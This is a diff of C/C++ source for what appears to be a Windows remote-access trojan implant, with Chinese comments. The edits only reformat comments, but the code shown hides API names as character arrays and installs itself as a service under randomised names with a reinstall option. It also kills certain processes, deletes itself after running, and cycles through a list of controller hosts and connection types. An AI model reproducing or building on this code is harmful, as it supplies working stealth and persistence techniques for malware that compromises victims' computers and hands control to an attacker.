@@ -580,10 +580,9 @@ void my_ServiceMain()
 		{
 			//域名
 			lpConnecte[0] = lpConnects[0];
-			if (HOST_INDEX == 0)
-			{
-				HOST_COUNT = getSplitLen(lpConnecte[0], ';');
-			}
+			//首次执行，获取地址数量
+			if (HOST_INDEX == 0) HOST_COUNT = getSplitLen(lpConnecte[0], ';');	
+			//获取指定index的地址
 			getSplit(lpConnecte[0], ';', HOST_INDEX, HOST);
 			PORT = m_OnlineInfo.Port1;
 
@@ -613,11 +612,12 @@ void my_ServiceMain()
 			if(mconct!=TRUE)   			//判断是否已经增加
 			{
 				HOST_INDEX++;
+				//index超出地址数量是测试下一组数据
 				if (HOST_INDEX >= HOST_COUNT)
 				{
 					HOST_INDEX = 0;
 					nConnect++;
-					if(nConnect>=3) nConnect=0;
+					if(nConnect>=3) nConnect=0;		//全部连接类型测试结束后循环测试
 				}
 
 			}
@@ -991,17 +991,17 @@ int APIENTRY WinMain( __in HINSTANCE hInstance,
 	    KProcess(); //K终结者进程
 
 	//读取安装服务名称
-	char Sermess[MAX_PATH]={NULL};  //
+	char Sermess[MAX_PATH]={NULL};                                          //
 	pwsprintfA(Sermess, JYvni08,m_ServiceInfo.ReleacsName);	
 	ReadRegEx(HKEY_LOCAL_MACHINE,Sermess,"ReleiceName", REG_SZ, (char *)ServiceName, NULL, sizeof(ServiceName), 0);
-	if(m_ServiceInfo.Dele_zc)  //复活安装
+	if(m_ServiceInfo.Dele_zc)                                               //复活安装
 	{
-        char szbuf_b[MAX_PATH]={NULL};  //本身路径
+        char szbuf_b[MAX_PATH]={NULL};                                      //本身路径
 		char Lfrfz05[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};
 	    GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz05);
-		pGetModuleFileNameA(NULL,szbuf_b,MAX_PATH);   //用于获取程序本身路径 
+		pGetModuleFileNameA(NULL,szbuf_b,MAX_PATH);                         //用于获取程序本身路径 
 
-        if (strcmp(szbuf_b,AZname)==0)  //判断自路径 是安装途径
+        if (strcmp(szbuf_b,AZname)==0)                                      //判断自路径 是安装途径
 		{	
 		    SERVICE_TABLE_ENTRY serviceTable[] = 
 			{
@@ -1011,45 +1011,46 @@ int APIENTRY WinMain( __in HINSTANCE hInstance,
 			char LCoHX01[] = {'S','t','a','r','t','S','e','r','v','i','c','e','C','t','r','l','D','i','s','p','a','t','c','h','e','r','A','\0'};
 			StartServiceCtrlDispatcherAT pStartServiceCtrlDispatcherA=(StartServiceCtrlDispatcherAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),LCoHX01);
 
-			Installope=1;  //写入运行方式  服务启动运行
+			Installope=1;                                                   //写入运行方式  服务启动运行
 			pSleep(500);
-			pStartServiceCtrlDispatcherA(serviceTable);   //服务运行文件
+			pStartServiceCtrlDispatcherA(serviceTable);                     //服务运行文件
 			pSleep(1000);
-			pStartServiceCtrlDispatcherA(serviceTable);   //服务运行文件
-			Installope=2;  //写入运行方式  服务无法启动改为直接运行
-			ServiceMain_2();  //直接运行文件
+			pStartServiceCtrlDispatcherA(serviceTable);                     //服务运行文件
+			Installope=2;                                                   //写入运行方式  服务无法启动改为直接运行
+			ServiceMain_2();                                                //直接运行文件
 		}
 	    else
 		{
 			memset(ServiceName, 0, sizeof(ServiceName));
-		    my_stormRands(13,ServiceName);  //随机服务名称
-		    my_stormRands(15,ServicePlay);  //随机服务显示
-		    my_stormRands(27,ServiceDesc);  //随机服务描述
-			ReleiceName(m_ServiceInfo.ReleacsName,ServiceName);  //写入安装服务名称
+		    my_stormRands(13,ServiceName);                                  //随机服务名称
+		    my_stormRands(15,ServicePlay);                                  //随机服务显示
+		    my_stormRands(27,ServiceDesc);                                  //随机服务描述
+			ReleiceName(m_ServiceInfo.ReleacsName,ServiceName);             //写入安装服务名称
 
 			char DQeBW01[] = {'%','s','\\','%','s','\0'};
-		    char AZnamess[MAX_PATH]={NULL};  //安装途径及名称
-		    Gyfunction->my_sprintf(AZnamess,DQeBW01,m_ServiceInfo.ReleasePath,m_ServiceInfo.ReleaseName);   //连接安装目录和程序名称
-			SetGroup(ServiceName, m_ServiceInfo.szGroup);//写入分组信息
-			MarkTime(ServiceName);  //写入服务版本安装时间信息
+		    char AZnamess[MAX_PATH]={NULL};                                 //安装途径及名称
+			                                                                //连接安装目录和程序名称
+		    Gyfunction->my_sprintf(AZnamess,DQeBW01,m_ServiceInfo.ReleasePath,m_ServiceInfo.ReleaseName);   
+			SetGroup(ServiceName, m_ServiceInfo.szGroup);                   //写入分组信息
+			MarkTime(ServiceName);                                          //写入服务版本安装时间信息
 
-			RunService(AZnamess,ServiceName,ServicePlay,ServiceDesc);  //安装服务
+			RunService(AZnamess,ServiceName,ServicePlay,ServiceDesc);       //安装服务
 
 			UINT strmin=0,strmin2=0;
 			char DYrEN27[] = {'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
             ShellExecuteAT pShellExecuteA=(ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
 			while(1)
 			{
-			    if(GetProcessID(m_ServiceInfo.ReleaseName))  //检查进程 发现程序运行
+			    if(GetProcessID(m_ServiceInfo.ReleaseName))                 //检查进程 发现程序运行
 				{
-					if(m_ServiceInfo.Dele_te)    //程序运行后删除
+					if(m_ServiceInfo.Dele_te)                               //程序运行后删除
 					{
-						DeleteMe();  //程序自删除
+						DeleteMe();                                         //程序自删除
 					}
 					break;
 				}
 				strmin++;
-				if(strmin>=3000)   //服务没启动程序 改为直接运行程序
+				if(strmin>=3000)                                            //服务没启动程序 改为直接运行程序
 				{
 					strmin=0;
 					pShellExecuteA(NULL,"open",AZnamess,NULL,NULL,SW_SHOW); //运行目标文件
